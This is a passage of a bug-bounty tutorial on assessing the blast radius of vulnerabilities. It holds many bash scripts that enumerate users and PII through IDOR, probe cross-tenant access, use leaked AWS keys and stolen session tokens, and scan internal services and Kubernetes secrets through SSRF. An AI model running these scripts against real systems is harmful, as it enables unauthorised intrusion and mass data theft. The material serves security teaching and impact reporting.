---
title: Collateral Damage Assessment
description: Systematic evaluation of the blast radius, cascading effects, and broader impact of discovered vulnerabilities during bug hunting engagements.
navigation:
  icon: i-lucide-radio-tower
  title: Collateral Damage Assessment
---

## What is Collateral Damage Assessment

::note
Collateral Damage Assessment (CDA) is the process of **measuring and documenting the full blast radius** of a vulnerability — identifying every user, system, dataset, and business function that could be affected if the vulnerability were exploited by a malicious actor.
::

In bug hunting, discovering a vulnerability is only half the battle. Understanding **how far the damage spreads** is what separates an informational finding from a critical submission that commands maximum payout.

CDA answers the question every security team asks: **"How bad could this really get?"**

::callout{icon="i-lucide-radio-tower" color="red"}
A single IDOR on a user profile endpoint might seem like a medium-severity issue — until CDA reveals it exposes **2.3 million users' PII**, including payment data, across every tenant in a multi-tenant SaaS platform.
::

### Why CDA Matters in Bug Hunting

::card-group
  ::card
  ---
  title: Maximizes Severity Rating
  icon: i-lucide-trending-up
  ---
  Demonstrating that a vulnerability affects **millions of users** or **critical infrastructure** elevates severity from Medium to Critical. Triage teams rely on CDA to assign CVSS scores.
  ::

  ::card
  ---
  title: Justifies Higher Bounties
  icon: i-lucide-dollar-sign
  ---
  Programs pay based on **demonstrated impact**. A well-documented CDA showing cascading failures, data breach scope, and business disruption potential earns top-tier rewards.
  ::

  ::card
  ---
  title: Prevents Underestimation
  icon: i-lucide-shield-alert
  ---
  Without CDA, triage teams may downgrade findings as low-impact. CDA provides the **evidence needed** to prevent unfair severity reduction.
  ::

  ::card
  ---
  title: Guides Remediation Priority
  icon: i-lucide-list-ordered
  ---
  Security teams use CDA data to **prioritize patches**. Vulnerabilities with wider blast radius get fixed first, making your report more actionable.
  ::
::

---

## CDA Methodology Framework

::tip
Follow a structured methodology: **Scope → Enumerate → Measure → Chain → Quantify → Document**.
::

```
┌──────────────────────────────────────────────────────────────────────┐
│               COLLATERAL DAMAGE ASSESSMENT FRAMEWORK                │
│                                                                      │
│   ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐       │
│   │  SCOPE   │──▶│ ENUMERATE│──▶│ MEASURE  │──▶│  CHAIN   │       │
│   │  Define  │   │  Affected│   │  Blast   │   │  Map     │       │
│   │  Boundary│   │  Assets  │   │  Radius  │   │  Effects │       │
│   └──────────┘   └──────────┘   └──────────┘   └──────────┘       │
│        │                                              │             │
│        │         ┌──────────┐   ┌──────────┐         │             │
│        └────────▶│ QUANTIFY │──▶│ DOCUMENT │◀────────┘             │
│                  │  Impact  │   │  Report  │                        │
│                  │  Metrics │   │  & Proof │                        │
│                  └──────────┘   └──────────┘                        │
│                                                                      │
│   Assessment Dimensions:                                             │
│   ─────────────────────                                              │
│   • User Impact ──────── How many users are affected?               │
│   • Data Exposure ────── What data types are at risk?               │
│   • System Spread ────── How many systems are reachable?            │
│   • Business Impact ──── What operations are disrupted?             │
│   • Temporal Scope ────── How long has this been exploitable?       │
│   • Cascade Potential ── What secondary failures occur?             │
│   • Regulatory Impact ── Which compliance frameworks are violated?  │
└──────────────────────────────────────────────────────────────────────┘
```

::steps{level="4"}

#### Define the Vulnerability Boundary

Identify the exact vulnerability, its location, and the immediate attack surface before assessing wider damage.

```bash
# Identify the vulnerable endpoint and technology stack
httpx -u "https://target.com/api/vulnerable-endpoint" \
  -tech-detect -status-code -content-length -title -server -silent

# Map the API surface connected to the vulnerable endpoint
curl -s "https://target.com/api/openapi.json" | jq '.paths | keys[]'
curl -s "https://target.com/api/swagger.json" | jq '.paths | keys[]'
curl -s "https://target.com/.well-known/openapi.yaml"

# Identify authentication scope
curl -s -I "https://target.com/api/vulnerable-endpoint" \
  -H "Authorization: Bearer TOKEN" | grep -iE "x-rate|x-scope|x-tenant|x-user"

# Determine if endpoint serves multiple tenants
curl -s "https://target.com/api/vulnerable-endpoint" \
  -H "Authorization: Bearer TENANT_A_TOKEN" | jq '.tenant_id'
curl -s "https://target.com/api/vulnerable-endpoint" \
  -H "Authorization: Bearer TENANT_B_TOKEN" | jq '.tenant_id'
```

#### Enumerate Affected Assets

Map every user, system, database, and service that falls within the blast radius.

```bash
# Count total affected user records via IDOR enumeration
# Determine the ID range
curl -s "https://target.com/api/users/1" -H "Authorization: Bearer TOKEN" | jq '.id'
# Binary search for max ID
for id in 1000 10000 100000 1000000; do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/api/users/${id}" -H "Authorization: Bearer TOKEN")
  echo "ID $id: HTTP $status"
done

# Enumerate data types exposed per record
curl -s "https://target.com/api/users/1" -H "Authorization: Bearer TOKEN" | \
  jq 'keys[]' | sort

# Check for nested sensitive data
curl -s "https://target.com/api/users/1" -H "Authorization: Bearer TOKEN" | \
  jq '.. | strings' | grep -iE "ssn|card|password|secret|token|key|phone|address|dob|birth"

# Map connected microservices via API responses
curl -s "https://target.com/api/users/1" -H "Authorization: Bearer TOKEN" | \
  jq '.. | .url? // .href? // .link? // empty' 2>/dev/null | sort -u

# Identify cross-service data flow
curl -s "https://target.com/api/users/1/orders" -H "Authorization: Bearer TOKEN" | jq '.'
curl -s "https://target.com/api/users/1/payments" -H "Authorization: Bearer TOKEN" | jq '.'
curl -s "https://target.com/api/users/1/documents" -H "Authorization: Bearer TOKEN" | jq '.'
```

#### Measure the Blast Radius

Quantify the exact scope of damage across all dimensions.

```bash
# Measure user count via pagination analysis
TOTAL=$(curl -s "https://target.com/api/users?page=1&per_page=1" \
  -H "Authorization: Bearer TOKEN" | jq '.total_count // .total // .count')
echo "Total affected users: $TOTAL"

# Alternative: Extract from response headers
curl -s -I "https://target.com/api/users" -H "Authorization: Bearer TOKEN" | \
  grep -iE "x-total|x-count|x-pagination|content-range"

# Measure data volume exposed
curl -s "https://target.com/api/users?page=1&per_page=100" \
  -H "Authorization: Bearer TOKEN" | wc -c
echo "Estimated total data: $(( $(wc -c < response.json) * ($TOTAL / 100) )) bytes"

# Assess geographic spread of affected users
curl -s "https://target.com/api/users?page=1&per_page=100" \
  -H "Authorization: Bearer TOKEN" | \
  jq '.[].country' | sort | uniq -c | sort -rn

# Measure temporal exposure window
# Check Wayback Machine for how long the endpoint has been live
curl -s "https://web.archive.org/cdx/search/cdx?url=target.com/api/vulnerable-endpoint&output=json&fl=timestamp&limit=5" | jq '.'

# Check certificate transparency logs for service age
curl -s "https://crt.sh/?q=target.com&output=json" | \
  jq '.[0].not_before' 2>/dev/null
```

#### Map Cascade Effects

Trace how the vulnerability propagates through interconnected systems.

```bash
# Identify downstream services affected by credential theft
# If SSRF exposes AWS credentials, check what those credentials can access
AWS_ACCESS_KEY_ID="LEAKED_KEY" \
AWS_SECRET_ACCESS_KEY="LEAKED_SECRET" \
aws sts get-caller-identity 2>/dev/null

# Map IAM permissions (what can the stolen creds do?)
AWS_ACCESS_KEY_ID="LEAKED_KEY" \
AWS_SECRET_ACCESS_KEY="LEAKED_SECRET" \
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2) 2>/dev/null

# Check S3 bucket access scope
AWS_ACCESS_KEY_ID="LEAKED_KEY" \
AWS_SECRET_ACCESS_KEY="LEAKED_SECRET" \
aws s3 ls 2>/dev/null | wc -l
echo "Accessible S3 buckets: $(aws s3 ls 2>/dev/null | wc -l)"

# If XSS is found, map all same-origin API endpoints accessible
curl -s "https://target.com/sitemap.xml" | grep -oP 'https?://[^<]+'
curl -s "https://target.com/robots.txt"

# Check if vulnerable subdomain shares cookies with main domain
curl -s -I "https://vulnerable.target.com" | grep -i "set-cookie" | grep -i "domain="
# If domain=.target.com, ALL subdomains are in blast radius

# Map shared authentication across services
for sub in api app admin dashboard portal accounts; do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://${sub}.target.com/api/me" \
    -H "Authorization: Bearer STOLEN_TOKEN" --max-time 5)
  echo "${sub}.target.com: HTTP $status"
done
```

::

---

## User Impact Assessment

::badge
Critical Dimension
::

### Measuring Affected User Population

::accordion
  ::accordion-item
  ---
  icon: i-lucide-users
  label: Direct User Enumeration
  ---

  Determine the exact number of users whose data, accounts, or sessions are at risk.

  ```bash
  # Method 1: API pagination total count
  curl -s "https://target.com/api/users?limit=1" \
    -H "Authorization: Bearer TOKEN" | jq '.meta.total'

  # Method 2: Response header analysis
  curl -s -I "https://target.com/api/users?page=1" \
    -H "Authorization: Bearer TOKEN" | grep -iE "x-total|x-count|total"

  # Method 3: Binary search for maximum valid ID
  check_id() {
    local id=$1
    local status=$(curl -s -o /dev/null -w "%{http_code}" \
      "https://target.com/api/users/${id}" \
      -H "Authorization: Bearer TOKEN" --max-time 3)
    echo "$status"
  }

  LOW=1
  HIGH=10000000
  while [ $LOW -lt $HIGH ]; do
    MID=$(( (LOW + HIGH) / 2 ))
    STATUS=$(check_id $MID)
    if [ "$STATUS" = "200" ]; then
      LOW=$((MID + 1))
    else
      HIGH=$MID
    fi
    echo "Testing ID: $MID → HTTP $STATUS (Range: $LOW-$HIGH)"
  done
  echo "Maximum user ID: $LOW"

  # Method 4: GraphQL count query
  curl -s -X POST "https://target.com/graphql" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"query":"{ usersConnection { aggregate { count } } }"}'

  # Method 5: Analyze registration statistics (public)
  curl -s "https://target.com/api/stats" | jq '.total_users'
  curl -s "https://target.com/about" | grep -iE "users|customers|accounts|members"

  # Method 6: Estimate from sequential IDs
  SAMPLE_IDS=$(for i in $(seq 1 10); do
    RAND=$((RANDOM % 100000))
    curl -s -o /dev/null -w "%{http_code}" \
      "https://target.com/api/users/${RAND}" \
      -H "Authorization: Bearer TOKEN"
    echo " ID:$RAND"
  done)
  echo "Sample results: $SAMPLE_IDS"
  ```
  ::

  ::accordion-item
  ---
  icon: i-lucide-user-check
  label: User Role Classification
  ---

  Not all affected users carry equal risk. Classify by role, privilege, and data sensitivity.

  ```bash
  # Extract user roles from API responses
  curl -s "https://target.com/api/users?limit=100" \
    -H "Authorization: Bearer TOKEN" | \
    jq '.[].role' | sort | uniq -c | sort -rn

  # Sample output analysis:
  # 847 "user"
  # 92  "moderator"
  # 23  "admin"
  # 5   "super_admin"
  # 3   "billing_admin"

  # Check if admin accounts are in the blast radius
  curl -s "https://target.com/api/users?role=admin" \
    -H "Authorization: Bearer TOKEN" | jq 'length'

  # Identify service accounts / API integrations affected
  curl -s "https://target.com/api/users?limit=1000" \
    -H "Authorization: Bearer TOKEN" | \
    jq '.[] | select(.type == "service" or .type == "api" or .type == "bot") | .name'

  # Check for privileged user data exposure
  curl -s "https://target.com/api/users?role=admin&limit=5" \
    -H "Authorization: Bearer TOKEN" | \
    jq '.[0] | keys[]'

  # Map organizational hierarchy exposure
  curl -s "https://target.com/api/organizations" \
    -H "Authorization: Bearer TOKEN" | jq '.[].name'

  ORG_COUNT=$(curl -s "https://target.com/api/organizations" \
    -H "Authorization: Bearer TOKEN" | jq 'length')
  echo "Organizations affected: $ORG_COUNT"
  ```
  ::

  ::accordion-item
  ---
  icon: i-lucide-globe
  label: Geographic & Jurisdictional Spread
  ---

  Determine which geographic regions and legal jurisdictions are affected — critical for regulatory impact.

  ```bash
  # Extract geographic distribution of affected users
  curl -s "https://target.com/api/users?limit=1000" \
    -H "Authorization: Bearer TOKEN" | \
    jq '.[].country' | sort | uniq -c | sort -rn | head -20

  # Check for EU users (GDPR implications)
  EU_COUNTRIES=("DE" "FR" "IT" "ES" "NL" "BE" "AT" "SE" "PL" "DK" "FI" "IE" "PT" "CZ" "RO" "HU" "BG" "HR" "SK" "SI" "LT" "LV" "EE" "LU" "MT" "CY" "GR")
  EU_COUNT=0
  for country in "${EU_COUNTRIES[@]}"; do
    count=$(curl -s "https://target.com/api/users?country=${country}&limit=1" \
      -H "Authorization: Bearer TOKEN" | jq '.meta.total // 0')
    EU_COUNT=$((EU_COUNT + count))
    [ "$count" -gt 0 ] && echo "$country: $count users"
  done
  echo "Total EU users in blast radius: $EU_COUNT"

  # Check for California residents (CCPA implications)
  CA_COUNT=$(curl -s "https://target.com/api/users?state=CA&limit=1" \
    -H "Authorization: Bearer TOKEN" | jq '.meta.total // 0')
  echo "California residents affected: $CA_COUNT"

  # Check for minors (COPPA implications)
  curl -s "https://target.com/api/users?limit=1000" \
    -H "Authorization: Bearer TOKEN" | \
    jq '[.[] | select(.age != null and .age < 18)] | length'

  # Analyze timezone distribution for geographic inference
  curl -s "https://target.com/api/users?limit=1000" \
    -H "Authorization: Bearer TOKEN" | \
    jq '.[].timezone' | sort | uniq -c | sort -rn
  ```
  ::

  ::accordion-item
  ---
  icon: i-lucide-activity
  label: Active Session Impact
  ---

  Assess how many users have active sessions that could be hijacked or invalidated.

  ```bash
  # Check active session count via admin/monitoring endpoints
  curl -s "https://target.com/api/admin/sessions" \
    -H "Authorization: Bearer TOKEN" | jq '.active_count'

  # If cookie theft is possible via XSS, estimate concurrent sessions
  curl -s "https://target.com/api/stats/online" \
    -H "Authorization: Bearer TOKEN" | jq '.'

  # Check session storage mechanism
  curl -s -I "https://target.com/api/me" \
    -H "Authorization: Bearer TOKEN" | grep -i "set-cookie"
  # Analyze: HttpOnly? Secure? SameSite? Domain scope?

  # Test session token predictability for broader impact
  for i in $(seq 1 5); do
    TOKEN=$(curl -s -c - "https://target.com/api/login" \
      -d "username=testuser${i}&password=test" | grep -oP 'session=\K[^\s;]+')
    echo "Session $i: $TOKEN"
  done
  # Compare tokens for patterns/predictability

  # Map cookie scope across subdomains
  curl -s -I "https://target.com/login" -c - | grep -i "set-cookie"
  # If Domain=.target.com, all subdomains share the session
  subfinder -d target.com -silent | while read sub; do
    echo "[*] Checking ${sub} for cookie acceptance"
    curl -s -o /dev/null -w "%{http_code}" "https://${sub}/" \
      -H "Cookie: session=STOLEN_TOKEN" --max-time 3
  done
  ```
  ::
::

---

## Data Exposure Assessment

::badge
Critical Dimension
::

### Data Classification & Sensitivity Mapping

::tip
Classify every exposed data field by sensitivity level. Regulatory bodies and bounty programs use data classification to determine severity and breach notification requirements.
::

```
┌──────────────────────────────────────────────────────────────────────┐
│                    DATA SENSITIVITY CLASSIFICATION                   │
│                                                                      │
│  ┌─────────────────────────────────────────────────────────────┐    │
│  │  CRITICAL (Tier 1)                                          │    │
│  │  ─────────────────                                          │    │
│  │  • Passwords / hashes        • Credit card numbers          │    │
│  │  • Social Security Numbers   • Bank account details         │    │
│  │  • Authentication tokens     • Private encryption keys      │    │
│  │  • API secrets / credentials • Medical records (PHI)        │    │
│  └─────────────────────────────────────────────────────────────┘    │
│                                                                      │
│  ┌─────────────────────────────────────────────────────────────┐    │
│  │  HIGH (Tier 2)                                              │    │
│  │  ─────────────                                              │    │
│  │  • Email addresses           • Phone numbers                │    │
│  │  • Physical addresses        • Date of birth                │    │
│  │  • Government IDs            • Biometric data               │    │
│  │  • Financial transactions    • Private messages             │    │
│  └─────────────────────────────────────────────────────────────┘    │
│                                                                      │
│  ┌─────────────────────────────────────────────────────────────┐    │
│  │  MEDIUM (Tier 3)                                            │    │
│  │  ───────────────                                            │    │
│  │  • Full names                • Employment details           │    │
│  │  • Purchase history          • Location data                │    │
│  │  • IP addresses              • Device fingerprints          │    │
│  │  • Behavioral analytics      • Internal user IDs            │    │
│  └─────────────────────────────────────────────────────────────┘    │
│                                                                      │
│  ┌─────────────────────────────────────────────────────────────┐    │
│  │  LOW (Tier 4)                                               │    │
│  │  ────────────                                               │    │
│  │  • Usernames (public)        • Profile preferences          │    │
│  │  • Public profile data       • UI settings                  │    │
│  │  • Non-sensitive metadata    • Public content               │    │
│  └─────────────────────────────────────────────────────────────┘    │
└──────────────────────────────────────────────────────────────────────┘
```

### Automated Data Exposure Analysis

::tabs
  ::tabs-item{icon="i-lucide-scan" label="Field Discovery"}

  ```bash
  # Extract all field names from API responses
  curl -s "https://target.com/api/users/1" \
    -H "Authorization: Bearer TOKEN" | \
    jq '[paths(scalars) | join(".")]' | sort

  # Deep scan for sensitive field names
  SENSITIVE_PATTERNS="password|passwd|pwd|secret|token|key|api_key|apikey|auth|credential|ssn|social_security|credit_card|card_number|cvv|cvc|expiry|bank|account_number|routing|iban|swift|private_key|secret_key|access_key"

  curl -s "https://target.com/api/users/1" \
    -H "Authorization: Bearer TOKEN" | \
    python3 -c "
  import json, sys, re
  data = json.load(sys.stdin)
  def find_sensitive(obj, path=''):
      if isinstance(obj, dict):
          for k, v in obj.items():
              current = f'{path}.{k}' if path else k
              if re.search('${SENSITIVE_PATTERNS}', k, re.I):
                  print(f'[SENSITIVE] {current} = {v}')
              find_sensitive(v, current)
      elif isinstance(obj, list):
          for i, v in enumerate(obj):
              find_sensitive(v, f'{path}[{i}]')
  find_sensitive(data)
  "

  # Check for PII in response headers
  curl -s -I "https://target.com/api/users/1" \
    -H "Authorization: Bearer TOKEN" | \
    grep -iE "x-user|x-email|x-name|x-account|x-customer"

  # Check for leaked data in error responses
  curl -s "https://target.com/api/users/99999999" \
    -H "Authorization: Bearer TOKEN" | \
    python3 -c "
  import json, sys
  try:
      data = json.load(sys.stdin)
      print(json.dumps(data, indent=2))
  except:
      print(sys.stdin.read())
  " | grep -iE "stack|trace|sql|query|internal|debug|config"
  ```
  ::

  ::tabs-item{icon="i-lucide-database" label="Volume Estimation"}

  ```bash
  # Calculate total data volume at risk
  # Step 1: Get single record size
  RECORD_SIZE=$(curl -s "https://target.com/api/users/1" \
    -H "Authorization: Bearer TOKEN" | wc -c)
  echo "Single record size: ${RECORD_SIZE} bytes"

  # Step 2: Get total record count
  TOTAL_RECORDS=$(curl -s "https://target.com/api/users?limit=1" \
    -H "Authorization: Bearer TOKEN" | jq '.meta.total')
  echo "Total records: ${TOTAL_RECORDS}"

  # Step 3: Calculate total exposure
  TOTAL_BYTES=$((RECORD_SIZE * TOTAL_RECORDS))
  TOTAL_MB=$((TOTAL_BYTES / 1048576))
  TOTAL_GB=$((TOTAL_BYTES / 1073741824))
  echo "Total data at risk: ${TOTAL_MB} MB (${TOTAL_GB} GB)"

  # Step 4: Estimate extraction time
  # Assuming 10 requests/second rate limit
  EXTRACTION_TIME=$((TOTAL_RECORDS / 10))
  echo "Estimated full extraction time: ${EXTRACTION_TIME} seconds ($((EXTRACTION_TIME / 3600)) hours)"

  # Check for bulk export endpoints that accelerate exfiltration
  curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/api/users/export" -H "Authorization: Bearer TOKEN"
  curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/api/users/download" -H "Authorization: Bearer TOKEN"
  curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/api/users.csv" -H "Authorization: Bearer TOKEN"

  # Check pagination limits for large data pulls
  for limit in 100 500 1000 5000 10000; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
      "https://target.com/api/users?limit=${limit}" \
      -H "Authorization: Bearer TOKEN")
    echo "Limit $limit: HTTP $status"
  done
  ```
  ::

  ::tabs-item{icon="i-lucide-file-search" label="Data Type Mapping"}

  ```bash
  # Automated PII detection across API responses
  analyze_pii() {
    local data="$1"
    
    # Email addresses
    echo "$data" | grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | \
      head -5 && echo "[PII] Email addresses detected"
    
    # Phone numbers
    echo "$data" | grep -oP '[\+]?[(]?[0-9]{1,4}[)]?[-\s\.]?[0-9]{1,4}[-\s\.]?[0-9]{1,9}' | \
      head -5 && echo "[PII] Phone numbers detected"
    
    # Credit card patterns
    echo "$data" | grep -oP '4[0-9]{12}(?:[0-9]{3})?' | \
      head -3 && echo "[CRITICAL PII] Visa card numbers detected"
    echo "$data" | grep -oP '5[1-5][0-9]{14}' | \
      head -3 && echo "[CRITICAL PII] Mastercard numbers detected"
    
    # SSN patterns
    echo "$data" | grep -oP '[0-9]{3}-[0-9]{2}-[0-9]{4}' | \
      head -3 && echo "[CRITICAL PII] SSN patterns detected"
    
    # IP addresses
    echo "$data" | grep -oP '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | \
      head -5 && echo "[PII] IP addresses detected"
    
    # JWT tokens
    echo "$data" | grep -oP 'eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*' | \
      head -3 && echo "[CRITICAL] JWT tokens detected"
    
    # AWS keys
    echo "$data" | grep -oP 'AKIA[0-9A-Z]{16}' | \
      head -3 && echo "[CRITICAL] AWS access keys detected"
    
    # Password hashes
    echo "$data" | grep -oP '\$2[ayb]\$.{56}' | \
      head -3 && echo "[CRITICAL] Bcrypt password hashes detected"
    echo "$data" | grep -oP '[a-f0-9]{32}' | \
      head -3 && echo "[HIGH] Potential MD5 hashes detected"
  }

  # Run PII analysis on vulnerable endpoint
  RESPONSE=$(curl -s "https://target.com/api/users?limit=100" \
    -H "Authorization: Bearer TOKEN")
  analyze_pii "$RESPONSE"

  # Cross-reference exposed fields with data protection categories
  curl -s "https://target.com/api/users/1" \
    -H "Authorization: Bearer TOKEN" | \
    jq 'to_entries[] | "\(.key): \(.value | type)"' | while read field; do
    KEY=$(echo "$field" | cut -d: -f1 | tr -d '"' | xargs)
    echo "$KEY → $(echo "$KEY" | grep -ciE 'email|phone|address|ssn|card|password|token|birth|gender|race|religion|health|salary' && echo 'SENSITIVE' || echo 'standard')"
  done
  ```
  ::
::

### Financial Data Exposure Assessment

::warning
Financial data exposure dramatically increases severity. Even partial card numbers combined with other PII can enable fraud.
::

```bash
# Check for payment data in user profiles
curl -s "https://target.com/api/users/1" \
  -H "Authorization: Bearer TOKEN" | \
  jq '. | {
    cards: .payment_methods,
    billing: .billing_address,
    transactions: .recent_transactions,
    balance: .account_balance,
    bank: .bank_details
  }'

# Check payment API endpoints accessible via vulnerability
PAYMENT_ENDPOINTS=(
  "/api/payments"
  "/api/billing"
  "/api/invoices"
  "/api/subscriptions"
  "/api/transactions"
  "/api/cards"
  "/api/payment-methods"
  "/api/refunds"
  "/api/charges"
  "/api/receipts"
)

for endpoint in "${PAYMENT_ENDPOINTS[@]}"; do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com${endpoint}" \
    -H "Authorization: Bearer TOKEN" --max-time 5)
  [ "$status" = "200" ] && echo "[ACCESSIBLE] ${endpoint}"
done

# Analyze transaction data exposure scope
curl -s "https://target.com/api/transactions?limit=100" \
  -H "Authorization: Bearer TOKEN" | \
  jq '{
    total_transactions: length,
    total_value: [.[].amount] | add,
    currencies: [.[].currency] | unique,
    date_range: {
      earliest: [.[].created_at] | sort | first,
      latest: [.[].created_at] | sort | last
    },
    has_card_details: [.[].card_last_four] | length,
    has_full_card: [.[] | select(.card_number != null)] | length
  }'

# Check for Stripe/Payment processor token exposure
curl -s "https://target.com/api/users/1" \
  -H "Authorization: Bearer TOKEN" | \
  grep -oE "(sk_live_|pk_live_|sk_test_|pk_test_|cus_|pm_|pi_|sub_|ch_|re_)[a-zA-Z0-9]+"
```

---

## System Spread Assessment

::badge
High Dimension
::

### Internal Network Reachability

::tabs
  ::tabs-item{icon="i-lucide-network" label="Service Discovery"}

  ```bash
  # Via SSRF: Map internal services reachable from the vulnerability
  INTERNAL_RANGES=(
    "127.0.0.1"
    "10.0.0.1"
    "172.16.0.1"
    "192.168.1.1"
    "192.168.0.1"
  )

  COMMON_PORTS=(80 443 8080 8443 3000 3306 5432 6379 9200 27017 11211 2379 8500 5984 9090 8888 4443 9443)

  for ip in "${INTERNAL_RANGES[@]}"; do
    for port in "${COMMON_PORTS[@]}"; do
      result=$(curl -s -o /dev/null -w "%{http_code}:%{time_total}" \
        "https://target.com/proxy?url=http://${ip}:${port}/" --max-time 3 2>/dev/null)
      http_code=$(echo "$result" | cut -d: -f1)
      time=$(echo "$result" | cut -d: -f2)
      if [ "$http_code" != "000" ] && [ "$http_code" != "502" ]; then
        echo "[REACHABLE] ${ip}:${port} → HTTP ${http_code} (${time}s)"
      fi
    done
  done

  # Identify internal service types via banners
  for service in "redis" "elasticsearch" "mongodb" "memcached" "consul" "etcd"; do
    case $service in
      redis)
        curl -s "https://target.com/proxy?url=http://127.0.0.1:6379/INFO" | head -5 ;;
      elasticsearch)
        curl -s "https://target.com/proxy?url=http://127.0.0.1:9200/" | jq '.name' ;;
      mongodb)
        curl -s "https://target.com/proxy?url=http://127.0.0.1:27017/" | head -5 ;;
      consul)
        curl -s "https://target.com/proxy?url=http://127.0.0.1:8500/v1/agent/members" | jq 'length' ;;
      etcd)
        curl -s "https://target.com/proxy?url=http://127.0.0.1:2379/version" | jq '.' ;;
    esac
  done

  # Internal Kubernetes service discovery
  curl -s "https://target.com/proxy?url=https://kubernetes.default.svc/api/v1/namespaces" | \
    jq '.items[].metadata.name'
  curl -s "https://target.com/proxy?url=https://kubernetes.default.svc/api/v1/services" | \
    jq '.items[] | {name: .metadata.name, namespace: .metadata.namespace, ports: .spec.ports}'
  ```
  ::

  ::tabs-item{icon="i-lucide-cloud" label="Cloud Infrastructure"}

  ```bash
  # AWS blast radius assessment via stolen credentials
  echo "=== AWS Blast Radius Assessment ==="

  # Identity
  aws sts get-caller-identity
  aws iam list-users | jq '.Users | length'
  aws iam list-roles | jq '.Roles | length'

  # S3 buckets accessible
  echo "--- S3 Buckets ---"
  aws s3 ls | wc -l
  aws s3 ls | while read line; do
    bucket=$(echo "$line" | awk '{print $3}')
    size=$(aws s3 ls "s3://${bucket}" --recursive --summarize 2>/dev/null | grep "Total Size" | awk '{print $3, $4}')
    objects=$(aws s3 ls "s3://${bucket}" --recursive --summarize 2>/dev/null | grep "Total Objects" | awk '{print $3}')
    echo "  $bucket: $objects objects, $size"
  done

  # EC2 instances
  echo "--- EC2 Instances ---"
  aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,State.Name,PrivateIpAddress]' --output table

  # RDS databases
  echo "--- RDS Databases ---"
  aws rds describe-db-instances --query 'DBInstances[].[DBInstanceIdentifier,Engine,DBInstanceStatus]' --output table

  # Lambda functions
  echo "--- Lambda Functions ---"
  aws lambda list-functions --query 'Functions[].FunctionName' --output table

  # Secrets Manager
  echo "--- Secrets ---"
  aws secretsmanager list-secrets --query 'SecretList[].Name' --output table

  # DynamoDB tables
  echo "--- DynamoDB Tables ---"
  aws dynamodb list-tables

  # SQS queues
  echo "--- SQS Queues ---"
  aws sqs list-queues

  # SNS topics
  echo "--- SNS Topics ---"
  aws sns list-topics
  ```
  ::

  ::tabs-item{icon="i-lucide-container" label="Container & Orchestration"}

  ```bash
  # Docker socket exposure assessment
  curl -s "https://target.com/proxy?url=http://127.0.0.1:2375/containers/json" | \
    jq '[.[] | {id: .Id[:12], image: .Image, state: .State, names: .Names}]'

  curl -s "https://target.com/proxy?url=http://127.0.0.1:2375/images/json" | \
    jq '[.[] | {id: .Id[:12], tags: .RepoTags}]'

  # Count containers in blast radius
  CONTAINER_COUNT=$(curl -s "https://target.com/proxy?url=http://127.0.0.1:2375/containers/json?all=true" | jq 'length')
  echo "Containers in blast radius: $CONTAINER_COUNT"

  # Kubernetes secrets extraction scope
  curl -s "https://target.com/proxy?url=https://kubernetes.default.svc/api/v1/secrets" \
    -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" | \
    jq '.items | length'

  # Kubernetes pod enumeration across namespaces
  NAMESPACES=$(curl -s "https://target.com/proxy?url=https://kubernetes.default.svc/api/v1/namespaces" | jq -r '.items[].metadata.name')
  for ns in $NAMESPACES; do
    POD_COUNT=$(curl -s "https://target.com/proxy?url=https://kubernetes.default.svc/api/v1/namespaces/${ns}/pods" | jq '.items | length')
    echo "Namespace: $ns → $POD_COUNT pods"
  done

  # Check for cross-namespace access (critical blast radius expansion)
  for ns in default kube-system monitoring production staging; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
      "https://target.com/proxy?url=https://kubernetes.default.svc/api/v1/namespaces/${ns}/secrets")
    echo "Namespace $ns secrets: HTTP $status"
  done
  ```
  ::
::

### Multi-Tenant Impact Assessment

::caution
In multi-tenant applications, a single vulnerability can compromise **all tenants**. This transforms a single-account issue into a platform-wide breach affecting every customer organization.
::

```bash
# Determine if the application is multi-tenant
curl -s "https://target.com/api/me" \
  -H "Authorization: Bearer TOKEN" | \
  jq '{tenant_id, organization_id, workspace_id, team_id, company_id}'

# Test cross-tenant access via IDOR
ATTACKER_TENANT=$(curl -s "https://target.com/api/me" \
  -H "Authorization: Bearer ATTACKER_TOKEN" | jq -r '.tenant_id')
VICTIM_TENANT="OTHER_TENANT_ID"

echo "Attacker tenant: $ATTACKER_TENANT"
echo "Attempting cross-tenant access..."

curl -s "https://target.com/api/tenant/${VICTIM_TENANT}/users" \
  -H "Authorization: Bearer ATTACKER_TOKEN" | jq 'length'

# Enumerate all tenant IDs
for id in $(seq 1 100); do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/api/tenant/${id}" \
    -H "Authorization: Bearer ATTACKER_TOKEN" --max-time 3)
  [ "$status" = "200" ] && echo "[ACCESSIBLE] Tenant $id"
done

# Check tenant isolation in shared resources
# Database: Can you query across tenant boundaries?
curl -s "https://target.com/api/search?q=*&tenant_id=${VICTIM_TENANT}" \
  -H "Authorization: Bearer ATTACKER_TOKEN"

# File storage: Can you access other tenants' files?
curl -s "https://target.com/api/files?tenant=${VICTIM_TENANT}" \
  -H "Authorization: Bearer ATTACKER_TOKEN"

# Webhook/integration endpoints: Cross-tenant exposure?
curl -s "https://target.com/api/integrations" \
  -H "Authorization: Bearer ATTACKER_TOKEN" | \
  jq '.[].webhook_url'

# Count total tenants for blast radius quantification
TOTAL_TENANTS=$(curl -s "https://target.com/api/admin/tenants?limit=1" \
  -H "Authorization: Bearer TOKEN" | jq '.meta.total // .total')
echo "Total tenants in blast radius: $TOTAL_TENANTS"
```

---

## Cascade Effect Analysis

::badge
